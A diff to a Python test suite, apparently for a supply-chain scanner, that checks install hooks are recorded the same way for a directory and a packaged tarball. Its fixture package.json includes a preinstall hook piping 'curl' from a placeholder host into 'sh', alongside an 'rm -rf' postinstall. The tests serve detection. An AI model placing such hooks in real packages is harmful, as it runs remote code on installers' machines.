@@ -34,23 +34,31 @@ FILES = {
 
 class Kinds:
     @staticmethod
-    def as_directory(root: Path) -> Path:
+    def directory_of(root: Path, files: dict[str, str]) -> Path:
         target = root / "repository"
-        target.mkdir()
-        for name, text in FILES.items():
+        for name, text in files.items():
+            (target / name).parent.mkdir(parents=True, exist_ok=True)
             (target / name).write_text(text, encoding="utf-8")
         return target
 
     @staticmethod
-    def as_package(root: Path) -> Path:
+    def package_of(root: Path, files: dict[str, str]) -> Path:
         target = root / "p-1.0.0.tgz"
         with tarfile.open(target, "w:gz") as archive:
-            for name, text in FILES.items():
+            for name, text in files.items():
                 data = text.encode()
                 info = tarfile.TarInfo(f"package/{name}")
                 info.size = len(data)
                 archive.addfile(info, io.BytesIO(data))
         return target
+
+    @staticmethod
+    def as_directory(root: Path) -> Path:
+        return Kinds.directory_of(root, FILES)
+
+    @staticmethod
+    def as_package(root: Path) -> Path:
+        return Kinds.package_of(root, FILES)
 
     @staticmethod
     def facts(target: Path) -> dict[str, Any]:
@@ -98,3 +106,64 @@ class TestTheSameFilesAsARepositoryAndAsAPackage:
             two["target_kind"],
             two["package"]["places"],
         )
+
+
+class TestInstallHooksAreInTheRecordForEveryKind:
+    """What a package runs when it is installed is the strongest signal the record holds: a published package carries its hooks and their programs exactly as the same files do as a directory."""
+
+    HOOKED = {
+        "package.json": json.dumps(
+            {
+                "name": "p",
+                "version": "1.0.0",
+                "main": "index.js",
+                "scripts": {
+                    "preinstall": "curl -s https://example.invalid/a | sh",
+                    "postinstall": "node setup.js && rm -rf cache",
+                },
+            }
+        ),
+        "index.js": "module.exports = 1;\n",
+        "setup.js": "console.log('setup');\n",
+    }
+
+    @classmethod
+    def hooks(cls, make: Any, tmp_path: Path) -> list[dict[str, Any]]:
+        return Kinds.facts(make(tmp_path, cls.HOOKED))["package"]["hooks"]
+
+    def test_the_same_manifest_gives_the_same_hooks_as_a_directory_and_as_a_package(
+        self, tmp_path: Path
+    ) -> None:
+        (tmp_path / "d").mkdir()
+        (tmp_path / "p").mkdir()
+        directory = self.hooks(Kinds.directory_of, tmp_path / "d")
+        package = self.hooks(Kinds.package_of, tmp_path / "p")
+        assert directory and directory == package
+
+    def test_each_hook_names_its_kind_and_the_programs_it_runs(self, tmp_path: Path) -> None:
+        package = self.hooks(Kinds.package_of, tmp_path)
+        assert {"kind": "postinstall", "programs": ["node", "rm"]} in package
+        assert {"kind": "preinstall", "programs": ["curl", "sh"]} in package
+
+    def test_a_package_without_hooks_has_none(self, tmp_path: Path) -> None:
+        plain = {
+            "package.json": json.dumps({"name": "p", "version": "1.0.0"}),
+            "index.js": "module.exports = 1;\n",
+        }
+        assert Kinds.facts(Kinds.package_of(tmp_path, plain))["package"]["hooks"] == []
+
+    def test_a_hook_of_a_dependency_a_package_vendors_is_not_the_packages_own(
+        self, tmp_path: Path
+    ) -> None:
+        files = {
+            **self.HOOKED,
+            "node_modules/dep/package.json": json.dumps(
+                {"name": "dep", "version": "1.0.0", "scripts": {"postinstall": "node dep.js"}}
+            ),
+            "node_modules/dep/dep.js": "module.exports = 1;\n",
+        }
+        (tmp_path / "d").mkdir()
+        (tmp_path / "p").mkdir()
+        directory = Kinds.facts(Kinds.directory_of(tmp_path / "d", files))["package"]["hooks"]
+        package = Kinds.facts(Kinds.package_of(tmp_path / "p", files))["package"]["hooks"]
+        assert directory == package
